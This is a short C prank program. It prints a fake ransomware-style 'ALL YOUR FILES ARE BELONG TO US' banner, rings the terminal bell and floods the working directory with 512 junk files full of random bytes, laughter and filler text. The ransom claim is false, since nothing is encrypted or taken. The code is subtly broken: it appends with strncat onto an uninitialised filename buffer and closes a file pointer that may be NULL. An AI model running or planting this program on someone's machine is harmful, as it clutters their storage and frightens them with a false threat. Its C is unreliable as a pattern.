#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int main(){
  int SPAM_MAX = 512;
  //Do the spam
  printf("\033[1;31mALL YOUR FILES ARE BELONG TO US\n");
  printf(" .d88888888b. \n");
  printf("d88P\"    \"Y88b\n");
  printf("888        888\n");
  printf("Y88b      d88P\n");
  printf(" \"88bo  od88\" \n");
  printf("d88888  88888b\033[0m\n\a");

  srand(time(NULL));
  for (int i = 0; i < SPAM_MAX; i++){
    char num[5];
    sprintf(num, "%d", i);
    char filename[16];
    strncat(filename, "omega", 6);
    strncat(filename, num, 3);
    strncat(filename, ".txt", 5);
    FILE *f = fopen(filename, "w");

    if (f){
      switch (i % 5) {
        case 0:
          for (int j = 0; j < 999; j++){
            if (j % 24 == 0) {fprintf(f, "CRY");}
            char junk = rand() % 128;
            fprintf(f, "%c", junk);
          }
          break;
        case 1:
          for (int j = 0; j < 99; j++) {fprintf(f, "HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA\n");}
          break;
        case 2:
          for (int j = 0; j < 99; j++) {fprintf(f, "I'VE ALREADY ASSIGNED MY LEGACY");}
          break;
        case 3:
          for (int j = 0; j < 99; j++) {fprintf(f, "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");}
          fprintf(f, ".");
          break;
        case 4:
          for (int j = 0; j < 99; j++) {fprintf(f, "qwertyuiopasdfghjkl;zxcvbnm12345678901234567890\n\t`~!@#$^&*()-=_+[]{},.<>/?");}
          break;
      }
    }

    fclose(f);
    memset(filename, 0 , strlen(filename));
  }

  return 0;
}
